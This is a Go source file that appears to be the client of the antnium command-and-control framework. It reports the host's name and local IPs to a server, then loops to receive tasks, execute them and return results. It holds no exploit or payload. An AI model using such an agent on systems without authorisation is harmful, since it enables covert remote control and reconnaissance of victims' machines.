package client

import (
	"errors"
	"math/rand"
	"strconv"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   ClientConfig
	Campaign model.Campaign

	upstream          Upstream
	DownstreamManager DownstreamManager
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := model.MakeCampaign()
	upstream := MakeUpstream(config, campaign)
	downstreamManager := MakeDownstreamManager()

	w := Client{
		config,
		campaign,
		upstream,
		downstreamManager,
	}
	return w
}

func (s *Client) Start() {
	s.DownstreamManager.StartListeners(s)
	go s.upstream.Start()

	err := s.sendPing()
	if err != nil {
		// Handle server not reachable
		log.Error("Could not ping: ", err.Error())
	}

	var p model.Packet
	for {
		// Block until we receive a packet from server
		p = <-s.upstream.Channel()

		p, err = s.DownstreamManager.Do(p)
		if err != nil {
			log.Error("Err: ", err.Error())
		}

		// Send answer back to server
		s.upstream.Channel() <- p
	}
}

func (s *Client) sendPing() error {
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	response["hostname"] = s.Config.Hostname
	model.AddArrayToResponse("localIp", s.Config.LocalIps, response)
	model.AddArrayToResponse("downstreams", s.DownstreamManager.GetList(), response)
	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)

	err := s.upstream.SendPacket(packet)
	if err != nil {
		return err
	}

	return nil
}

// SendDownstreams is used to notify server about any new downstreams
func (s *Client) SendDownstreams(downstreamList []string) error {
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	model.AddArrayToResponse("name", downstreamList, response)

	packet := model.NewPacket("downstreams", s.Config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)

	err := s.upstream.SendPacket(packet)
	if err != nil {
		return err
	}

	return nil
}
